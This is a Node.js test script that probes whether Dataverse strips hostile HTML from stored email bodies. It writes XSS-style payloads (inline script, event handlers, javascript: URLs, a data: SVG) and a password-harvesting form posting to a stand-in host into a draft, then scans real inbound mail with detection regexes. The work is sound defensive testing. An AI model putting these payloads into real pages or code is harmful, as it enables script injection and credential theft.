// S12 — Does Dataverse sanitise an email body for us?
//
//   node scripts/spikes/s12-sanitise-probe.mjs [--confirm]
//
// Environment guard and token acquisition: see scripts/deploy/README.md.
//
// The question, raised during design review 2026-09-11: we do not handle raw MIME, we handle a
// Dataverse `email` row. Does the platform already strip hostile markup from `description`, making
// client-side sanitising unnecessary?
//
// Two halves, because there are two ways a body arrives:
//   A. WE write it (drafts we create, and anything a spike seeds) — round-trip a hostile payload.
//   B. THE PLATFORM writes it (server-side sync of real inbound mail) — inspect real stored bodies
//      for markup that a sanitiser would have removed.
//
// Creates ONE draft email (never sent, IssueSend is not called) and deletes it again. Dry run
// unless --confirm, because it writes to a shared environment.
import { CONFIRM, apiRaw, getEnv } from '../lib/dv.mjs';

const { org: ORG } = getEnv();

// Non-throwing on purpose: the probe reports each response rather than stopping at the first.
const api = (path, method = 'GET', body, headers = {}) => apiRaw(path, { method, body, headers });

// ── The payload. Every item is something a sanitiser must remove or neutralise. ──────────────
const PROBES = [
  { id: 'script',        html: `<script>window.__pwned=1</script>`,                      why: 'inline script' },
  { id: 'img-onerror',   html: `<img src="x" onerror="window.__pwned=2">`,               why: 'event handler attribute' },
  { id: 'svg-onload',    html: `<svg onload="window.__pwned=3"></svg>`,                  why: 'SVG event handler' },
  { id: 'a-javascript',  html: `<a href="javascript:window.__pwned=4">klik her</a>`,     why: 'javascript: URL' },
  { id: 'iframe',        html: `<iframe src="https://example.invalid/x"></iframe>`,      why: 'nested browsing context' },
  { id: 'object',        html: `<object data="https://example.invalid/x"></object>`,     why: 'plugin embed' },
  { id: 'form',          html: `<form action="https://example.invalid/steal" method="post"><input name="pw" type="password"><button>Log ind</button></form>`, why: 'credential-harvesting form' },
  { id: 'style-tag',     html: `<style>.ms-Button{display:none!important}body{background:#f0c}</style>`, why: 'unscoped stylesheet — would restyle the host app' },
  { id: 'meta-refresh',  html: `<meta http-equiv="refresh" content="0;url=https://example.invalid/x">`, why: 'redirect' },
  { id: 'base',          html: `<base href="https://example.invalid/">`,                 why: 'rewrites every relative URL on the page' },
  { id: 'data-svg-img',  html: `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9J3dpbmRvdy5fX3B3bmVkPTUnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zyc+PC9zdmc+">`, why: 'script inside a data: SVG' },
  { id: 'target-blank',  html: `<a href="https://example.invalid/x" target="_blank">ekstern</a>`, why: 'needs rel=noopener added' },
  // Things that MUST survive, or our own features break:
  { id: 'keep-id',       html: `<div id="divRplyFwdMsg">quoted history marker</div>`,    why: 'KEEP — quote detection matches this id' },
  { id: 'keep-class',    html: `<div class="gmail_quote">gmail quote marker</div>`,      why: 'KEEP — quote detection matches this class' },
  { id: 'keep-table',    html: `<table border="1"><tr><th>Position</th><td>485,00</td></tr></table>`, why: 'KEEP — half of B2B mail is a table' },
  { id: 'keep-style-at', html: `<p style="color:#a4262c;font-weight:bold">rød tekst</p>`, why: 'KEEP — senders colour things deliberately' },
  { id: 'keep-cid',      html: `<img src="cid:image001@01DC0000.00000000">`,             why: 'KEEP — inline image reference' },
];

const BODY = `<html><body><div>S12 probe. Each block below is one test case.</div>\n${
  PROBES.map((p) => `<!-- ${p.id} -->\n${p.html}`).join('\n')
}\n</body></html>`;

console.log(`Target: ${ORG}\n`);

// ══ HALF B first — read-only, so it runs even in a dry run ══════════════════════════════════
console.log('── B. What the platform itself stored, for REAL inbound mail ──\n');

const inbound = await api(
  `emails?$select=activityid,subject,directioncode,createdon&$filter=directioncode eq false&$orderby=createdon desc&$top=12`,
);
if (!inbound.ok) {
  console.log(`  FAILED to list inbound email: ${inbound.status} ${inbound.txt.slice(0, 200)}`);
} else {
  const rows = inbound.json.value ?? [];
  console.log(`  Inspecting the ${rows.length} most recent RECEIVED emails.\n`);

  // Markers a sanitiser would act on. Counted across real stored bodies.
  const MARKERS = [
    ['<script', 'script tag'],
    // \b matters: without it, `content="` matches as `ontent="` and every Exchange body
    // false-positives. Cost me a wrong number once; do not remove the word boundary.
    ['\\bon\\w+\\s*=\\s*["\']', 'event handler attribute'],
    ['javascript:', 'javascript: URL'],
    ['<iframe', 'iframe'],
    ['<object', 'object'],
    ['<embed', 'embed'],
    ['<form', 'form'],
    ['<style', 'style TAG'],
    ['<base', 'base tag'],
    ['<meta', 'meta tag'],
    ['data:image/svg', 'data: SVG image'],
    ['style\\s*=\\s*["\']', 'style ATTRIBUTE (expected, must keep)'],
    ['<table', 'table (expected, must keep)'],
    ['\\sid\\s*=\\s*["\']', 'id attribute (expected, must keep)'],
    ['\\sclass\\s*=\\s*["\']', 'class attribute (expected, must keep)'],
    ['position\\s*:\\s*(fixed|absolute)', 'position:fixed/absolute in CSS'],
  ];
  const tally = new Map(MARKERS.map(([, label]) => [label, 0]));
  let inspected = 0;
  let totalBytes = 0;

  for (const row of rows) {
    const one = await api(`emails(${row.activityid})?$select=description`);
    const html = one.json?.description ?? '';
    if (!html) continue;
    inspected += 1;
    totalBytes += html.length;
    for (const [pattern, label] of MARKERS) {
      if (new RegExp(pattern, 'i').test(html)) tally.set(label, tally.get(label) + 1);
    }
  }

  console.log(`  Bodies fetched: ${inspected} · ${(totalBytes / 1024).toFixed(1)} KiB total\n`);
  for (const [label, n] of tally) {
    const flag = n > 0 ? (label.includes('must keep') ? '   (as expected)' : '  <-- PRESENT IN STORED DATA') : '';
    console.log(`    ${String(n).padStart(3)} / ${inspected}  ${label}${flag}`);
  }
}

// ══ HALF A — the round-trip. Writes, so it needs --confirm ══════════════════════════════════
console.log('\n── A. Round-trip: write hostile HTML to a draft, read it back ──\n');

if (!CONFIRM) {
  console.log('  DRY RUN — no draft created. Re-run with --confirm to test the write path.');
  console.log(`  Would create one draft email (never sent) with ${PROBES.length} probe blocks,`);
  console.log('  read its description back, compare, then delete it.');
  process.exit(0);
}

const created = await api('emails', 'POST', {
  subject: 'S12 sanitise probe — DELETE ME',
  description: BODY,
  statuscode: 1, // Draft
}, { Prefer: 'return=representation' });

if (!created.ok) {
  console.log(`  FAILED to create the draft: ${created.status} ${created.txt.slice(0, 300)}`);
  process.exit(1);
}
const id = created.json.activityid;
console.log(`  Created draft ${id}`);

const readBack = await api(`emails(${id})?$select=description`);
const stored = readBack.json?.description ?? '';

console.log(`  Wrote ${BODY.length} bytes, read back ${stored.length} bytes` +
            `${stored.length === BODY.length ? '  — IDENTICAL LENGTH' : '  — CHANGED'}\n`);

let removed = 0;
let survived = 0;
for (const p of PROBES) {
  const isKeep = p.id.startsWith('keep-');
  // Compare on a whitespace-insensitive basis; the platform may reformat.
  const norm = (s) => s.replace(/\s+/g, ' ').trim();
  const present = norm(stored).includes(norm(p.html));
  if (present) survived += 1; else removed += 1;
  const verdict = present
    ? (isKeep ? 'kept    (correct)' : 'SURVIVED  <-- not sanitised')
    : (isKeep ? 'REMOVED   <-- would break our features' : 'removed (sanitised)');
  console.log(`    ${p.id.padEnd(14)} ${verdict.padEnd(28)} ${p.why}`);
}
console.log(`\n  ${survived} of ${PROBES.length} probe blocks survived the round-trip.`);

const del = await api(`emails(${id})`, 'DELETE');
console.log(`  Deleted draft ${id} -> ${del.ok || del.status === 404 ? 'ok' : `FAILED ${del.status}`}`);
